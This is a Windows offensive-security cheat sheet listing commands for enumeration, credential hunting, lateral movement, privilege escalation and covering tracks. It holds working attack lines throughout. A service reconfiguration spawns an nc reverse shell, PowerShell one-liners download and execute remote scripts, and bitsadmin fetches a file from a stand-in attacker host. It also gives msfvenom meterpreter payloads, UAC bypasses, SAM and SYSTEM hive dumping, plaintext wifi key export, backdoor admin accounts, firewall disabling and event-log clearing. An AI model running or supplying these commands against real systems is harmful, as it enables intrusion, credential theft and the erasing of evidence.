WINDOWS COMMANDS
 
BASIC
systeminfo
hostname
whoami
whoami /all
echo %username%
ipconfig /all
route print
netstat -ntlp
    -listening ports
netstat -bano
netsat -r
    -routing table
command | findstr /C:"str"
    -grep
echo %userdomain%
echo %path%
shutdown /r
start explorer
    -execute path builtin program (same as input to win+r)
env
set
path
    -print currently defined execution path
setx c:\Program Files(x86)\bin\
    -append target directory to currently defined execution path
runas /profile /user:administrator "C:\absolute\path\pcoff.exe"
    -run target "executable" with user profile permissiosn for /user:
        --*should prompt for target user's password
START /B process.exe
    run code excution in background
for %%i in (C:\abs\path\*) do %%i
    OR
for /F "usebackq" %i in (`dir /b C:\macros\Day\`) DO %i
    -execute all files in a directory
Auto-Start Directories
Windows NT 6.1,6.0
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
Windows NT 5.2, 5.1, 5,0
%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\
Windows 9x
%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
Windows NT 4.0, 3.51, 3.50
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\
   
FILESYSTEM
type file
    -print file
dir /s *pass* == *cred* == *vnc* == *.config*
dir \ /s /b | find /I “searchstring”
findstr /si password *.xml *.ini *.txt
fsutil fsinfo drives
    -list drives currently on the system
    --requires admin privs
assoc
    -print returned list of file extension associations
assoc .ps1=powershellfile
ftype powershellfile="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
    -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with
dir /a-r-d /s /b
    -check directory for writeable files
powershell Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern "everyone"
    -check for world-writeable files
   
File Transfer  
iexplore.exe http://blah.com/filename.zip
C:\windows\explorer.exe http://somewhere.com/filename.ext
ftp ftp.site.dom
   
   
USERS
whoami
net users
net user /domain
    -list users in current domain
net user username
    -list user info
net user name pass /add
    -add local system user
net user user_name * /domain
    -add user to domain with interactive prompt for password
net user name setpword
net user /DOMAIN %USERNAME%
    -check user's network group membership
net user /domain user
    -check another user's information
net group "Domain Users" /domain
    -list users in AD group
net localgroup "administrators" /domain
    -list domain local group users
net group “Domain Admins” /domain
net group “Enterprise Admins” /domain
net group “Domain Controllers” /domain
NET LOCALGROUP "Remote Desktop Users" trinity /ADD
net accounts
    -prints password policy for locahost
net accounts /domain
dsmod user /?
    -get dsmod commands cruft
dsmod user administrator -pwd NewPassword -mustchpwd yes
    -modify user password, set pwExpired flag
 
 
NETWORK
arp -A
net view
    -view available network share hosts
net view \\HOST
    -view available shares on host
net view /domain:otherdomain
    Queries NBNS/SMB (SAMBA) and tries to find all hosts in ‘otherdomain’
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed
dir \\computername\share_or_admin_share\
net use \\computer\share
    -mount an smb share
net use X: \\10.2.2.224\C$
net use * http//hostname/nfs/ pword /USER:username
net share name=c:\path\to\share
    -create smb share
net share name=c:\path\to\share /GRANT:Everyone,FULL
    -make an smb share world-accessable
pushd \\10.2.2.224\C$
    -mount remote file share to automatically mapped drive
cacls c:\path\ /T /E /G user:f
    -grant user full file access control from path
tasklist /V /S computername
    Lists tasks w/users running those tasks on a remote system
netsh firewall show state
netsh firewall show config
netsh firewall set opmode disable
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
    -enable remote wmi
netsh interface ip set address local dhcp
    -configure nic to user dhcp
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
    -open port (for rdesktop)
netsh advfirewall firewall add rule name="Block mssql attack ips" dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213
    -close port (for rdesktop)
netsh advfirewall set allprofiles state off
netsh wlan show profiles
    -shows all saved wireless profiles
netsh wlan export profile folder=. key=clear
    exports a user wifi profile with the password in plaintext to an xml file in the current working directory
netsh wlan [start|stop] hostednetwork
    Starts or stops a wireless backdoor on a windows 7 pc
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent|temporary
    Complete hosted network setup for creating a wireless backdoor on win 7
netsh wlan set hostednetwork mode=[allow|disallow]
netdom query trust /Domain:dnsname
    OR
nltest /domain_trusts /All_Trusts
 
 
 
SERVICES/PROCESSES/PERMISSIONS && configuration
tasklist
tasklist /SVC
taskkill <pid>
net start
    -list all running services
sc [stop|start] service
sc qc service
    -view configuration of a service
    ->sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    ->sc config upnphost obj= ".\LocalSystem" password= ""
    ->net start upnphost
sc query
sc queryex
schtasks /query /fo LIST /v
net start RpcSs
net stop RpcSs
    -start stop rpc service on localhost
c:\windows\system32\gathernetworkinfo.vbs
    (Windows 7)Included script with, enumerates builtin config information
pkgmgr /iu:"TelnetServer"
pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI
pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel
    (On Vista) install update or uninstall update builtin process
icacls "dir\"
    -check the file permissions of a folder
 
WMIC
    WINDOWS MANAGEMENT INSTRUMENTATION
**default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/
    QUERIES
SELECT [Class property name|*] FROM [CLASS NAME] <WHERE [CONSTRAINT]>
SELECT * FROM Win32_Process WHERE Name LIKE “%chrome%”
    -wmic instance query
    INFORMATION
wmic /?
    WMIC enable (remote)
wmic startupwmic service
    -start remote wmi service
netsh firewall set service RemoteAdmin enable
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
    -make exception in firewall for remote wmic service
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CIMOM\AllowAnonymousCallback
Get-WmiObject -Namespace "root\cimv2" -Class Win32_LogicalDisk -ComputerName <REMOTE_IP> -Credential <DOMAIN\User>
    -test remote wmi access
    ENUMERATION
wmic qfe
    -patch level information
wmic qfe get
    -list patching information for localhost
wmic qfe qfe hotfixid
wmic qfe get Caption,Description,HotFixID,InstalledOn\
    -get windows patch level information
wmic process list full
    -list all attributes of all running processes
wmic process get caption,executablepath,commandline
wmic process call create “program”
wmic process where name=“program” call terminate
    -kill target program
wmic process get caption,executablepath,commandline /format:csv
wmic useraccount
wmic useraccount get /ALL
wmic useraccount where name='uname' get sid
wmic useraccount where sid='S-1-3-12-1234525106-3567804255-30012867-1437' get name
wmic useraccount where (name='administrator' and domain='%computername%') get name,sid
    -get name/sid for system admin
wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
    -get name/sid for domain admin
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    -check for trusted service paths(privesc)
wmic get /ALL /format:csv
wmic share get /ALL
    -list smb shares
wmic logicaldisk get name
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
wmic start list full
    -list startup programs
wmic computersystem get domain
wmic ntdomain list
    -domain and DC info
PRIVESC enumeration
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    -find unquote service path
 
   
   
REGISTRY
*note HKLM keys are for HKey local machine registry
*HKCU keys are for HKey current user registry entries
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
    -together allow users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    -enable RDP
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
    -grep the registry for key word "password"
REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 2 /f
    -change startup type for rpc service to automatic
REG add "HKLM\SYSTEM\CurrentControlSet\services\RpcSs" /v Start /t REG_DWORD /d 4 /f
    -change startup type for rpc service to disabled
reg add
"HKEY_LOCAL_MACHINE\SYSTEM\Current ControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
    -(win7) curely registered executables within the system registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    -windows autologin
reg query "HKCU\Software\ORL\WinVNC3\Password"
    -vnc stored password
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
    -putty cleartext credentials
reg save HKLM\Security security.hive    --save security.hive
reg save HKLM\System system.hive    --save system hive to file
reg save HKLM\SAM sam.hive  --save sam to file
reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f
    -UAC bypass for win 7/8/10
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f && START /W sdclt.exe && reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
    -UAC bypass for win 10
 
START>Administrative Tools>Server Manager>Features>Add Features>Administrative Tools>Windows Powershell
    -enable powershell on machine
POWERSHELL
syntax (from cmd.exe, where installed):
    Special Characters
" The beginning (or end) of quoted text
# The beginning of a comment
$ The beginning of a variable
& Reserved for future use
( ) Parentheses used for subexpressions
; Statement separator
{ } Script block
| Pipeline separator
` Escape character
    .\Powershell.exe -command <command> <parameter(s)>
    attrib +R c:\path\to\file.txt
    $var = "hello"
    Powershell.exe -command Get-HotFix
        -check Windows patch level
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetUser
        -display all AD users
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-UserProperties -Properties name,memberof,description,info
        -return AD user proprietary information
    set-ItemProperty -Path 'HKLM:\System\Current\ControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
        -format for making registry queries from powershell
        --enable RDP on target hostname
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        -enable existing firewall rule, e.g. RDP allow
    powershell.exe -command New-NetFirewallRule -DisplayName "Allow Inbound Port 80" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
        -create new firewall rule set to allow
        --to create a block rule set -Action Block
    powershell.exe -command Get-Service
        -show all services
    powershell.exe -command Restart-Service
        -restart target service
    powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
        -Configure the DNS Server (to 8.8.8.8/Google)
    powershell.exe -command Get-Process
        -return a process listing
    Start-Job { 'C:\bin\hashcat\bin\hashcat64.exe' } -Name cracker
    bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\Path\to\outfile.ext
        -download a file
        ACTIVE DIRECTORY cmdlets
    Get-Job -State
    Stop-Job cracker
    Get-Command *text*
    Get-Command -Verb Get
    Get-Command -Noun Service
    Get-Help Get-Command (-Detailed,-Full,-Examples,-Online)
        OR
    Get-Command -?
    Get-SmbServerConfiguration
    Set-SmbServerConfiguration -EnableSMB1Protocol $true
    Get-ChildItem -Path C:\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-NetComputers
        -return listing of hosts in Active Directory
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Get-Information
        -return information collected on sys,reg,&c
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter
        -search network for hosts in use by Domain Admin(s)
    Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1');Invoke-Userhunter -UserName "admin"
        -search network for host user "admin" is on
    get-aduser -filter {name -like "krbtgt*"} -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1
        -get information for krbtgt active directory domain account
    Get-ADForest | Select Domains
        -enum domains in an AD forest
    Get-ADDomain | FL NetBIOSName
        -get netbios name of an AD domain
    Get-ADTrust -filter *
 
Powershell x WMIC
    wmic.exe
Powershell WMI cmdlets
-- Get-WmiObject
-- Get-CimAssociatedInstance
-- Get-CimClass
-- Get-CimInstance
-- Get-CimSession
-- Set-WmiInstance
-- Set-CimInstance
-- Invoke-WmiMethod
-- Invoke-CimMethod
-- New-CimInstance
-- New-CimSession
-- New-CimSessionOption
-- Register-CimIndicationEvent
-- Register-WmiEvent
-- Remove-CimInstance
-- Remove-WmiObject
-- Remove-CimSession
Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential ‘WIN-B85AAA7ST4U\Administrator'
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
    -av detection
SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory < 2147483648
SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors < 2
SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE “%VMware%”
SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE “%VMware%”
SELECT * FROM Win32_Process WHERE Name=”vmtoolsd.exe”
SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE “%VMware%”
    -vm detection
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ‘notepad.exe’
    -code execution, like psexec but stealthier
       
SYSINTERNALS
PSEXEC
psexec /?
psexec -accepteula
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
psexec \\10.2.2.23 netsh firewall set service remoteadmin enable
psexec \\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable
 
CLEANUP
wevtutil el
    -list logs
wevtutil cl log.log
    -clear specific lowbadming
del %WINFRT%\*.log /a /s /q /f
 
ADVANCED
DRIVERQUERY
 
LOCAL EXPLOITS
KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
-patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008
KB2503665:
    patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp1/2, server 2008 sp1/2, 7 (sp0/1)
    Table of patch replacements:
#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |
#                               -------------------------------------------------------------
#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |
#   -----------------------------------------------------------------------------------------
#   Windows x86 XP SP3          | Installed | <-Replaces|     -     |     -     |     -     |
#   Windows x86 Server 2003 SP2 | Installed | <-Replaces| <-Replaces|     -     | <-Replaces|
#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | <-Replaces|
 
 
Policy files (may contain passwords)
SYSVOL/(../)Groups.xml
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
 
 
Configuration files commonly left behind by mass rollouts/older (pre-)devops
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
 
Trusted Service Paths
    exploit/windows/local/trusted_service_path
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
icacls "C:\Program Files (x86)\Target"
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
    -now replace Target\target.exe with payload
sc stop target
sc start target
    -now the reverse shell should be spawned as privileged user
 
Vulnerable Services
    exploit/windows/local/service_permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc qc target
sc config target binpath= "net user hacker P@ssword123! /add"
sc stop target
sc start target
sc config target binpath= "net localgroup Administrators hacker /add"
sc stop target
sc start target
    -errors may occur starting service, but only after commands are executed
 
AlwaysInstallElevated
    exploit/windows/local/always_install_elevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi
msiexec /quiet /qn /i C:\Users\User\Downloads\exploit.msi
 
DLL Injection
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
 





WIN filesystem read targets
 
tier 1
%SYSTEMDRIVE%\boot.ini
    near ubiquitous, confirmation that a read is happening
%WINDIR%\win.ini
    second test file if boot.ini cannot be found/returned
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
    stores users' passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \repair is locked, but can be retired using forensic or Volume Shadow copy methods
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
    key to read SAM hashes in plaintext without cracking
%WINDIR%\repair\security
%SYSTEMDRIVE%\autoexec.bat
 
TIER 1, LOCATION NOT SET BY DEFAULT
unattend.txt
unattend.xml
sysprep.inf
    --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location.
 
tier 2
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\software
%WINDIR%\iis6.log
    (or 5 or 7, given version)
%WINDIR%\system32\logfiles\httperr\httperr1.log
    --iis6 error log
%SystemDrive%\inetpub\logs\LogFiles
    --IIS 7’s logs location
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts



references
http://www.fuzzysecurity.com/tutorials/16.html
https://www.toshellandback.com/2015/11/24/ms-priv-esc/


https://pastebin.com/FehvXsEZ
https://pastebin.com/HvKs18zh